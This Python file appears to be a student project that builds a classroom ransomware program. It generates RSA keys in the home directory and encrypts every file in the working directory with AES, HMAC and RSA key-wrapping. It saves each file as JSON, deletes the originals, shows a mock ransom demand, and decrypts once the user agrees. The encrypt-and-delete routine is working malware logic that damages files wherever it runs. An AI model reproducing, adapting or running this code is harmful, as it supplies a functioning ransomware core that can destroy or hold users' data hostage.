import sys# I think some of these imports arnet needed tho...
from pathlib import Path # home dir: str(Path.home())

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization

import os
import cnsts
import MyRSAEncrypt
import MyfileEncrypt
import Myencrypt
import MyfileEncryptMAC
import MyencryptMAC
import pickle   #use pickle as opposed to JSON due to issues with byte strings
                #pickle.dumps(theThingYouWantToBecomeAByteString) returns a byte string.
                #pickle.loads(byteString) will do the inverse of that.
import json # BUTT GUESS WAT, WII HEAV 2 YOOSE JSON B-CUZ TEACH SAID SOHE

#TODO: so now we make the malware, so here is how it is gona work
# what we do is when the program is run, it checks a dir for the keys(probs wana make this global.) (you can use os.getcwd() and os.chdir() for this)
# if they dont exsist, we make them.
# then we load the keys into memory,
# now we need to get info on the current working dir for all of the files in it. (no sub dirs. and exclide the malware executable, use os.listdir() and os.path.isfile() for this)
# use the info to turn each one into a JSON file with the encrypted data.(also just for kicks we are going to log the json file info where the keys are.)
# we tell the user that something bad happend and that they need to pay us moneh.
# at this point the malware goes into moneh collect mode where it asks the user to pay off a debit to goto the next part.
# when it is all paid off then we get all of the JSON files we made and decrypt them, saving each one to the working dir.
# then we are done.

# this will be used to get the file names for encryption. for testing purposes, lets NOT use this until we are done with everything else.

def keyGen(): #key generator
	kg = rsa.generate_private_key(public_exponent=65537,key_size=2048,backend=default_backend())
	#pk = private_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword'))
	prvkNoENC = kg.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,encryption_algorithm=serialization.NoEncryption())
	pubkNoENC = kg.public_key().public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
	
	open(cnsts.kPrv,"wb").write(prvkNoENC)
	open(cnsts.kPub,"wb").write(pubkNoENC)# these are both .pem files, I looked it up.

def pubKeyFix():
	kData = open(cnsts.kPrv,"rb").read()
	kg = serialization.load_pem_private_key(kData,password=None,backend=default_backend())
	pubkNoENC = kg.public_key().public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
	open(cnsts.kPub,"wb").write(pubkNoENC)# these are both .pem files, I looked it up.

def getFilez():

	filez=[]
	for i in os.listdir():
			if(os.path.isfile(i)):
				filez.append(i)
	# this makes sure to omit the running script or executable from the list of stuff.
	try:
		dis = sys.executable[len(os.getcwd()):]# normaly this just shows the python interpreter exe. HOWEVER...
		if(dis[0]=='\\'): dis = dis[1:] # when compiled this points to the actual exe file used in the final product.
		filez.remove(dis)
	except: print('')
	try: filez.remove(__file__)
	except: print('')
	try: filez.remove(cnsts.kPrv)
	except: print('')
	try: filez.remove(cnsts.kPub)
	except: print('')
	return filez

def checkKeys(homeDir,activeDir):
	os.chdir(homeDir)
	if(not os.path.isfile(cnsts.kPrv)): keyGen()
	elif(not os.path.isfile(cnsts.kPub)): pubKeyFix()
	os.chdir(activeDir)
	
def getPrvKey(homeDir,activeDir): #unused function
	os.chdir(homeDir)
	return open(cnsts.kPrv,"rb").read()
	os.chdir(activeDir)
	
def getPubKey(homeDir,activeDir): #unused function
	os.chdir(homeDir)
	return open(cnsts.kPub,"rb").read()
	os.chdir(activeDir)
	
def option6(filePath,homeDir,activeDir):
	#print("Select file to encrypt: ",end='')
	#filePath = input()
	#print("Select public key: ",end='')
	#keyPath = input()
	
	f = MyfileEncryptMAC.norm(filePath) #filepath = [C, IV, key,fileDir,fileName,fileExt,tag,HMAC]
	
	
	ccat = pickle.dumps([f[2],f[7]]) # I still have a use for pickle, its to concatinate the key and HMAC together.
	
	g = b''
	os.chdir(homeDir)
	while(ccat!=b''):# so this whole bit was to get around a 241byte limitation of RSA encryption.
		#print(str(len(ccat[:128])),end=', ')
		thBit = MyRSAEncrypt.norm(ccat[:128],cnsts.kPub) #encrypted key
		ccat = ccat[128:]
		g = g + thBit # the encrypted bit is double in size '256'
		#print(str(len(thBit)),end='')
		#input()
	# the trick here was to only RSAencrypt the conactination of the key and HMAC key(<- the phat fucc rite here), 
	os.chdir(activeDir)
	#open((f[3]+f[4]+".ukn"),"wb").write(pickle.dumps([g,f[0],f[1],f[5],f[6]])) #[RSAC,C,IV,fileext,tag]
	# the above was a pickle writer, dropped in favor of JSON.
	theDict = { # all of these are arrays of int values between 0-255
		'RSACipher':list(g),
		'C':list(f[0]),
		'IV':list(f[1]),
		'ext':f[5], # this is a string
		'tag':list(f[6])
	}
	
	returnName = (f[3]+f[4]+".json")
	json.dump(theDict,open(returnName,'w'),indent=4)
	os.remove(filePath) #delete the file.
	return returnName
	#print("done",end='')
	#input()
	
def option7(filePath,homeDir,activeDir):
	#print("Select file to decrypt: ",end='')
	#filePath = input()
	#print("Select private key: ",end='')
	#keyPath = input()
	
	fileObj = open(filePath, "r") #open file, and save the referance for later
	location = filePath.rstrip(os.path.basename(fileObj.name)) #cut off the file's directory
	cutFile = (os.path.basename(fileObj.name)).partition('.') #place the file's name into a list [fileName, ., ext]
	theDict = json.load(fileObj)
	# gets the above [RSAC, C, IV, ext,tag]
	
	RSAC = bytes(theDict['RSACipher'])# careful, its pickled.
	C = bytes(theDict['C'])
	IV = bytes(theDict['IV'])
	tagData = bytes(theDict['tag'])
	
	bb = b''
	os.chdir(homeDir)
	while(RSAC!=b''):
		#print(str(len(gg[:256])),end=', ')
		thBit = MyRSAEncrypt.inv(RSAC[:256],cnsts.kPrv) #encrypted key
		RSAC = RSAC[256:]
		bb = bb + thBit # the encrypted bit is double in size '256'
		#print(str(len(thBit)),end='')
		#input()
	os.chdir(activeDir)
	gg = pickle.loads(bb)# here is my idea of undoing the concatination, remeber [key, HMAC]
	
	buff = MyencryptMAC.inv(C,IV,gg[0],tagData,gg[1])
	open((cutFile[0]+'.'+theDict['ext']),"wb").write(buff)
	fileObj.close()# hey you forgot to close this :/
	os.remove(filePath) # delete the file.
	
	#print("done",end='')
	#input()
	
def main():
	homeDir = str(Path.home()) # ima save the keys here. and the save data(basically a record of all the locations of the encrypted files.)
	activeDir = os.getcwd() # this value starts off in the dir where the exe was launched.
	
	checkKeys(homeDir,activeDir)
	#getPrvKey(homeDir,activeDir)
	#getPubKey(homeDir,activeDir)
	
	fileList = getFilez()
	hostages = []# this is NOT where the encrypted files are stored, just their names.
	#TODO: as a bonus you can make it so that if the user closes the program b4 "paying"
	# and decrypting to have the malware resume where they left off.
	# here is a hint: save 'hostages' as a json file in the same directory were im keeping the keys.
	# the exsistance of such a file will tell the malware, that it already unloaded its payload and still needs to collect.
	
	for i in fileList: hostages.append(option6(i,homeDir,activeDir))# remember this from our test program? its been modified a bit for repeated use.
	
	print("ono, the documents in the place become locced at once>>>",end='')
	input()
	print("payemt is require for operation. pliz give mone ammount 10000000000000000000000000000000000000000\n00bitcon>>>",end='')
	input()
	print("give?y/n): ",end='')
	usrInpt = input()
	while(usrInpt.upper()!='Y'):
		print("pliz\ngive?y/n): ",end='')
		usrInpt = input()
	print("thank>>>",end='')
	input()
	print("we unlocc at once",end='')
	
	for i in hostages: option7(i,homeDir,activeDir)# another self stolen function from the tester.
	
	print(">>>",end='')
	input()
	
main()
